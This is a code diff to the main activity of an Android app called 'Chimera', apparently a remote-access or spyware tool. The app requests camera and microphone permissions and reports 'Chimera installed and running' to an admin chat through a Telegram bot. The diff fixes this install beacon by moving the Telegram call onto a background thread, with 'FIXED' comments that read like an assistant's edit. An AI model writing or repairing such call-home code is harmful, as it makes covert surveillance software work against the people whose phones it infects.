@@ -50,7 +50,6 @@ public class MainActivity extends AppCompatActivity {
     private void requestPerms() {
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                // UPDATED: Removed WRITE_EXTERNAL_STORAGE from this list
                 String[] perms = new String[]{
                         Manifest.permission.CAMERA,
                         Manifest.permission.RECORD_AUDIO,
@@ -95,16 +94,23 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void sendInstallMessage() {
-        try {
-            String token = ConfigLoader.getBotToken();
-            long chat = ConfigLoader.getAdminId();
-            if (token == null || chat == 0) return;
-            String url = "https://api.telegram.org/bot" + token + "/sendMessage";
-            String body = "{\"chat_id\":" + chat + ",\"text\":\"Chimera installed and running\"}";
-            TelegramBotWorker worker = new TelegramBotWorker(this);
-            worker.post(url, body);
-        } catch (Exception e) {
-            ErrorLogger.logError(this, "MainActivity_SendInstall", e);
-        }
+        // FIXED: Run the network operation on a background thread
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    String token = ConfigLoader.getBotToken();
+                    long chat = ConfigLoader.getAdminId();
+                    if (token == null || chat == 0) return;
+                    String url = "https://api.telegram.org/bot" + token + "/sendMessage";
+                    String body = "{\"chat_id\":" + chat + ",\"text\":\"Chimera installed and running\"}";
+                    
+                    // The post method is static in TelegramBotWorker, so we can call it directly
+                    TelegramBotWorker.post(url, body, MainActivity.this);
+                } catch (Exception e) {
+                    ErrorLogger.logError(MainActivity.this, "MainActivity_SendInstall", e);
+                }
+            }
+        }).start();
     }
 }
